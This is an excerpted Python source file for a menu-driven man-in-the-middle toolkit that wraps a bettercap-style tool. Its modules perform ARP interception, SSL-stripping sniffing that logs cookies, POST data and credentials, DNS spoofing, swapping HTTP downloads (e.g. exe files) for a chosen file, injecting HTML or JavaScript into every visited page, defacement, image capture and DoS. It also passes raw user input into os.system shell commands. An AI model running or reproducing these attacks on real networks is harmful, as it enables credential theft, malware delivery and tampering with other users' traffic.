...
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] dev-x-hack-scaner must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")
...
#Configure the network interface and gateway. 
		def config0():
			global up_interface
			up_interface = open('/opt/dev-x-hack-scaner/tools/files/iface.txt', 'r').read()
			...
			global gateway
			gateway = open('/opt/dev-x-hack-scaner/tools/files/gateway.txt', 'r').read()
...
# Show a random banner. Configured in banner.py .  
			...
			print ("""
[+]═══════════[ Author : @daowd romany \033[1;36m_-\|/-_\033[1;m Website: www.devx.shop ]═══════════[+]
...
┌═════════════════════════════════════════════════════════════════════════════┐
█                                                                             █
█                         Your Network Configuration py daowd romany          █ 
█                                                                             █
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")
			...
			# Print dev-x-hack-scaner short description , using terminaltables as table. 
			table_datas = [
			    ['\033[1;36m\nInformation\n', 'dev-x-hack-scaner is a penetration testing toolkit whose goal is to \nperform man in the middle attacks for testing purposes. \nIt brings various modules that allow to realise efficient attacks.\nThis tool is Powered by dev-x.\033[1;m']
			]
		...
		def scan(): 
			...
			f = open('/opt/dev-x-hack-scaner/tools/log/scan.txt','w')
			f.write(scan)
			f.close()

			devices = os.popen(" grep report /opt/dev-x-hack-scaner/tools/log/scan.txt | awk '{print $5}'").read()

			devices_mac = os.popen("grep MAC /opt/dev-x-hack-scaner/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address

			devices_name = os.popen("grep MAC /opt/dev-x-hack-scaner/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(This device)\033[1;m"
		...
		def target_ip():
			...
			target_ips = raw_input("\033[1;36m\033[4mdev-X\033[0m\033[1;36m ➮ \033[1;m").strip()
...
#modules section
			def program0():
				...
				def option():
					...
					options = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m\033[1;36m ➮ \033[1;m").strip() # select an option , port scan , vulnerability scan .. etc...
					# Port scanner
					if options == "pscan":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         Port Scanner py daowd romany         █
█                                                              █
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def pscan():
							...
							action_pscan = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mpscan\033[0m\033[1;36m ➮ \033[1;m").strip()#ip to scan
							if action_pscan == "back":
								...
								save_pscan = open('/opt/dev-x-hack-scaner/tools/log/pscan.txt','w') # Save scanned ports result.
								save_pscan.write(scan_port)
								save_pscan.close()

								# Grep port scan information
								ports = os.popen("grep open /opt/dev-x-hack-scaner/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
								ports_services = os.popen("grep open /opt/dev-x-hack-scaner/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
								ports_state = os.popen("grep open /opt/dev-x-hack-scaner/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state



								# Show the result of port scan

								check_open_port = os.popen("grep SERVICE /opt/dev-x-hack-scaner/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dos():
							...
							action_dos = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdos\033[0m\033[1;36m ➮ \033[1;m").strip() 
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""") 
						def ping():
							...
							action_ping = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mping\033[0m\033[1;36m ➮ \033[1;m").strip() 
							...
							if action_ping == "back":
								...
								fping = open('/opt/dev-x-hack-scaner/tools/log/ping.txt','w') #Save ping result , then grep some informations.
								fping.write(ping_cmd)
								fping.close()

								ping_transmited = os.popen("grep packets /opt/dev-x-hack-scaner/tools/log/ping.txt | awk '{print $1}'").read()
								ping_receive = os.popen("grep packets /opt/dev-x-hack-scaner/tools/log/ping.txt | awk '{print $4}'").read()
								ping_lost = os.popen("grep packets /opt/dev-x-hack-scaner/tools/log/ping.txt | awk '{print $6}'").read()
								ping_time = os.popen("grep packets /opt/dev-x-hack-scaner/tools/log/ping.txt | awk '{print $10}'").read()
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         Inject Html py daowd romany          █
█                                                              █
█           Inject Html code in all visited webpage            █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_html():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'injecthtml' command.\n\033[1;m")
							action_inject = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjecthtml\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_inject == "back":
								...
								html_file = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mInjecthtml\033[0m\033[1;36m ➮ \033[1;m")
								...
								if html_file == "back":
									...
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_code = os.system("cp " + html_file + " /opt/dev-x-hack-scaner/tools/bettercap/modules/tmp/file.html")
									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/dev-x-hack-scaner/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                       Replace Download py daowd romany       █
█                                                              █
█            Replace files being downloaded via HTTP           █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def rdownload():
							print("\033[1;32m\n[+] Please type 'run' to execute the 'rdownload' command.\n\033[1;m")
							action_rdownload = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_rdownload == "back":
								...
								module = "/opt/dev-x-hack-scaner/tools/bettercap/modules/http/replace_file.rb"
								print("\033[1;32m\n[+] Specify the extension of the files to replace. (e.g. exe)\n\033[1;m")
								ext_rdownload = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip()
								print("\033[1;32m\n[+] Set the file to use in order to replace the ones matching the extension.\n\033[1;m")
								file_rdownload = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m")
								...
								if file_rdownload == "back":
									...
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/dev-x-hack-scaner/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
									rdownload()						
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								rdownload()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						...
						def snif():
							...
							action_snif = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_snif == "back":
								option()
								...
								def snif_sslstrip():
									...
									action_snif_sslstrip = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
									if action_snif_sslstrip == "y":
										print("\033[1;34m\n[++] All logs are saved on : /opt/dev-x-hack-scaner/dev-Xsniff \033[1;m")
										...
										make_file = os.system("mkdir -p /opt/dev-x-hack-scaner/dev-Xsniff && cd /opt/dev-x-hack-scaner/dev-Xsniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'dev-x-hack-scaner' -hold -e "tail -f /opt/dev-x-hack-scaner/dev-Xsniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/dev-x-hack-scaner/dev-Xsniff/" + filename + ".log --sniffer-output /opt/dev-x-hack-scaner/dev-Xsniff/" + filename + ".pcap")
										def snifflog():
											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
											action_log = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm /opt/dev-x-hack-scaner/dev-Xsniff/" + filename + ".*")
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dspoof():
							...
							action_dspoof = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_dspoof == "back":
								...
								action_dspoof_ip = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
								dns_conf = action_dspoof_ip + " .*\.*"
								outdns = open('/opt/dev-x-hack-scaner/tools/files/dns.conf','w')
								...
								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /opt/dev-x-hack-scaner/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
								dspoof()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dspoof()
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            Yplay py daowd romany             █
█                                                              █
█    PLay youtube videos as background sound in all webpages   █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def yplay():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'yplay' command.\n\033[1;m")
							action_yplay = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_yplay == "back":
								...
								video_id = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
								if video_id == "back":
									option()
									...
									code_yplay = open('/opt/dev-x-hack-scaner/tools/bettercap/modules/tmp/yplay.txt','w')
									code_yplay.write(code)
									code_yplay.close()
									print("\033[1;34m\n[++] PLaying : https://www.youtube.com/watch?v=" + video_id + " \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/dev-x-hack-scaner/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
									yplay()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								yplay()
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          Image Replace py daowd romany       █
█                                                              █
█        Replace all web pages images with your own one        █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def replace():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'replace' command.\n\033[1;m")
							action_replace = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_replace == "back":
								...
								img_replace = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m")
								...
								if img_replace == "back":
									...
									img.save('/opt/dev-x-hack-scaner/tools/bettercap/modules/tmp/ximage.png')
									print("\033[1;34m\n[++] All images will be replaced by " + img_replace + "\033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									

									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/dev-x-hack-scaner/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /opt/dev-x-hack-scaner/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            Driftnet py daowd romany          █
█                                                              █
█          View all images requested by your target            █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def driftnet():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'driftnet' command.\n\033[1;m")
							action_driftnet = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdriftnet\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_driftnet == "back":
								...
								print("\033[1;34m\n[++] All captured images will be temporarily saved in /opt/dev-x-hack-scaner/xedriftnet \033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_driftnet = os.system("mkdir -p /opt/dev-x-hack-scaner/xedriftnet && driftnet -d /opt/dev-x-hack-scaner/xedriftnet > /dev/null 2>&1 &")
								cmd_driftnet_sniff = os.system("xettercap  -X")
								cmd_driftnet_2 = os.system("rm -R /opt/dev-x-hack-scaner/xedriftnet")
								driftnet()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								driftnet()
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           Shakescreen py daowd romany        █
█                                                              █
█                   Shaking Web Browser content                █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def shakescreen():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'move' command.\n\033[1;m")
							action_shakescreen = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mshakescreen\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_shakescreen == "back":
								...
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file '/opt/dev-x-hack-scaner/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
								shakescreen()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								shakescreen()
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                       Inject Javascript py daowd romany      █
█                                                              █
█       Inject Javascript code in all visited webpage.         █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_j():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'injectjs' command.\n\033[1;m")
							action_inject_j = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_inject_j == "back":
								...
								js_file = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m")
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                        Deface Web Page py daowd romany       █
█                                                              █
█        Overwrite all web pages with your HTML code           █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def deface():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'deface' command.\n\033[1;m")
							action_deface = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_deface == "back":
								...
								file_deface = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m")
								...
								if file_deface == "back":
									...
									f1 = open('/home/home/dev-X-html.html','w')
									f1.write(content)
									f1.close()

									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/dev-x-hack-scaner/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/dev-X-html.html -I " + up_interface + " --gateway " + gateway )
									deface()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								deface()
...
deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
		...
		def cmd0():
			while True:
				...
				cmd_0 = raw_input("\033[1;36m\033[4mdev-X\033[0m\033[1;36m ➮ \033[1;m").strip()
				if cmd_0 == "scan": # Map the network
					...
					def gateway():
						...
						n_gateway = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mgateway\033[0m\033[1;36m ➮ \033[1;m").strip()
						...
						if n_gateway == "back":
							...
							s_gateway = open('/opt/dev-x-hack-scaner/tools/files/gateway.txt','w')
					...
					def iface():
						...
						n_up_interface = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4miface\033[0m\033[1;36m ➮ \033[1;m").strip()
						...
						if n_up_interface == "back":
							...
							s_up_interface = open('/opt/dev-x-hack-scaner/tools/files/iface.txt','w')
					...
					def rm_log():
						print("\033[1;32m\n[+] Do want to remove all dev-x-hack-scaner logs ? (y/n)\n\033[1;m")
						cmd_rmlog = raw_input("\033[1;36m\033[4mdev-X\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m").strip()
						if cmd_rmlog == "y":
							rmlog = os.system("rm -f -R /opt/dev-x-hack-scaner/dev-Xsniff/ /opt/dev-x-hack-scaner/tools/log/* /opt/dev-x-hack-scaner/tools/bettercap/modules/tmp/* /opt/dev-x-hack-scaner/tools/files/dns.conf")
...
rmlog    :  Delete all dev-x-hack-scaner logs.

help     :  Display this help message.

exit     :  Close dev-x-hack-scaner.\n\033[1;m"""]
					]
					table = DoubleTable(table_datas)
					print(table.table)
